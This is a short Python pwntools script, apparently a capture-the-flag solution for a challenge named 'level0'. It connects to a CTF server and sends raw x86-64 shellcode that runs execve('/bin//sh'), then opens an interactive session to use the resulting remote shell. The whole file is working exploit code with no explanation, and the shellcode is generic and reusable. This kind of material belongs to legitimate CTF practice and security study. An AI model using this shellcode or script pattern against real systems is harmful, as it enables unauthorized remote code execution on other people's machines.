from pwn import *

proc = remote("nc.ctf.unitedctf.ca", 6000)
#proc = process("level0")

print(proc.recv().strip().decode())
proc.sendline(b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")
proc.interactive()
